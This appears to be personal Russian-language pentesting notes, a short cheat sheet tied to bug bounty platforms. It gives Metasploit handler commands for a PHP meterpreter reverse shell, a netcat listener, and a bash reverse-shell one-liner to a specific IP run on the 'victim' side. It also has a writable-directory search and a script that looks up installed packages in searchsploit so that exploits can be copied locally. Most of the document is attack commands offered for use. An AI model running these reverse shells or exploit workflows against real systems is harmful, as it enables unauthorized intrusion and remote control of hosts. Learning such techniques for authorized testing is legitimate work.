# Info

+ https://hacker101.com/
+ https://bugbounty.ru/
+ https://bugbounty.standoff365.com/
+ https://bugbounty.bi.zone/

## Metasploit framework

Содержит эксплоиты различных уязвимостей.

Позволяет удобно использовать rce, создавая сессии с уязвимым хостом.

Пример создания сессии с загруженным php файлом:

```shell
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <ваш_IP>
set LPORT 4444
exploit
```

## netcat

Более понятный способ установки обратного соединения

```shell
# Создаем слушателя на стороне атакующего
nc -lvnp 4444
```

```shell
# Выполняем команду на стороне жертвы
bash -i >& /dev/tcp/10.127.241.33/4444 0>&1
```

Команда позволяет найти директории, в которых пользователь может создавать файлы
```shell
find / -type d -writable 2>dev/null
```

Команда создает соединение и позволяет выполнять команды на удаленном хосте

## Searchsploit

Вывод установленных пакетов в linux и их версий

Надо доработать, чтобы постфиксы :amd64 убирал в названии пакетов

```shell
dpkg -l | awk '/^ii/ {print $2, $3}'
```

Скрипт для проверки пакетов в searchsploit

```shell
#!/bin/bash

# Файл с именами приложений
file="apps.txt"

while IFS= read -r app; do
    echo "Searching exploits for: $app"
    searchsploit "$app"
    echo "-------------------------------------"
done < "$file"
```

После того как находим информацию, копируем exploit локально

```shell
searchsploit -m linux/local/15304.txt
```
